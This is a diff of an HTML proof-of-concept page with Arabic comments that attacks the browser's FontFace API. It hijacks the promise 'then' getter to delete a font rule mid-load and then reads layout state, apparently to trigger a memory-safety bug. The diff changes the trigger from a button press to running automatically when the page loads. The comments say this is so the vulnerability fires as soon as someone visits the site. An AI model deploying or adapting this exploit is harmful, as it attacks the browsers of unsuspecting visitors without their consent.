@@ -2,22 +2,25 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>فحص الثغرة الأصلية - المرحلة المتقدمة</title>
+    <title>تحليل التوقيت التلقائي - التفعيل الفوري</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
-        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 350px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
+        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
         .log { margin-bottom: 8px; }
         .warn { color: #ffaa00; }
         .error { color: #ff3333; }
-        button { background-color: #00ffcc; color: #000; padding: 10px 20px; font-weight: bold; border: none; cursor: pointer; }
+    </style>
+    
+    <style id="s">
+        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
     </style>
 </head>
 <body>
 
-    <h2>مراقبة التوقيت المتقدم (Macro-task Delay)</h2>
-    <button onclick="runPoc()">تشغيل فحص التوقيت</button>
+    <h2>مراقبة التفعيل التلقائي (Automated Userland Trigger)</h2>
+    <p>يتم الفحص الآن تلقائياً بمجرد تحميل المتصفح للمستند...</p>
     
-    <div id="custom-console">[نظام المحاكاة نشط]: جاهز لتتبع الفجوة الزمنية...</div>
+    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار تحميل الصفحة...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
@@ -29,53 +32,60 @@
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        function runPoc() {
-            screenLog("بدء إعداد البيئة الهيكلية...");
-            
-            const style = document.createElement('style');
-            style.id = "s";
-            document.head.appendChild(style);
-            style.sheet.insertRule("@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }", 0);
+        // تفعيل الثغرة تلقائياً بمجرد دخول الموقع
+        window.onload = () => {
+            consoleElement.innerHTML = ""; // تصفير واجهة العرض لبدء التتبع الفوري
+            screenLog("تم رصد دخول الموقع - بدء تشغيل الثغرة تلقائياً...");
 
-            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-            document.fonts.add(A);
-            void A.loaded;
+            try {
+                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                document.fonts.add(A);
+                void A.loaded;
 
-            let fired = false;
+                let fired = false;
 
-            Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
-                get() {
-                    if (!fired && this === A) {
-                        fired = true;
-                        screenLog("!! تم رصد المقاطعة المنطقية !!", true);
+                // إعداد كمين التداخل مع الحماية من الـ OOM
+                Object.defineProperty(FontFace.prototype, 'then', {
+                    configurable: true,
+                    get() {
+                        if (!fired && this === A) {
+                            fired = true;
+                            screenLog("!! تم تفعيل الكمين المنطقي أثناء تحميل الصفحة !!", true);
+                            
+                            // محاولة إغراق وتغيير حالة الذاكرة بكائنات خطوط أخرى
+                            new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                            new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                            
+                            try {
+                                document.getElementById('s').sheet.deleteRule(0);
+                                screenLog("تم حذف القاعدة التنسيقية تلقائياً.");
+                            } catch(e) { 
+                                screenLog("خطأ أثناء الحذف التلقائي: " + e.message, true); 
+                            }
+                            
+                            // تأجيل القراءة عبر خيط التنفيذ التالي (Macro-task Window)
+                            setTimeout(() => {
+                                screenLog("محاولة القراءة المؤجلة (offsetTop) بعد انتهاء دورة التحميل الأصلية...");
+                                let offset = document.body.offsetTop;
+                                screenLog("قيمة الـ Offset المسترجعة تلقائياً: " + offset);
+                            }, 10); // زيادة مهلة التأخير طفيفاً لمنع الـ Pinning
+                        }
                         
-                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                        
-                        try {
-                            document.getElementById('s').sheet.deleteRule(0);
-                            screenLog("تم إرسال أمر حذف القاعدة.");
-                        } catch(e) { screenLog("خطأ أثناء الحذف: " + e.message, true); }
-                        
-                        // التعديل الهندسي: ترحيل القراءة إلى الـ Macro-task Queue لكسر تمسك المكدس
-                        setTimeout(() => {
-                            screenLog("محاولة القراءة المؤجلة (offsetTop) بعد تفريغ المكدس الأصلي...");
-                            let offset = document.body.offsetTop;
-                            screenLog("قيمة الـ Offset المسترجعة بعد التأجيل: " + offset);
-                        }, 0);
+                        return function(resolve) { if (resolve) resolve(); };
                     }
-                    
-                    return function(resolve) { if (resolve) resolve(); };
-                }
-            });
+                });
 
-            screenLog("استدعاء document.fonts.load الحالي...");
-            document.fonts.load('1em x', 'AB');
-        }
+                // إطلاق الدالة الرسمية لتنشيط الـ Pipeline
+                screenLog("إرسال طلب التحميل المباشر document.fonts.load...");
+                document.fonts.load('1em x', 'AB');
+
+            } catch (err) {
+                screenLog("خطأ عام في النظام: " + err.message, true);
+            }
+        };
 
         window.onerror = function(msg) {
-            screenLog("استثناء في النظام: " + msg, true);
+            screenLog("استثناء غير معالج: " + msg, true);
             return true;
         };
     </script>
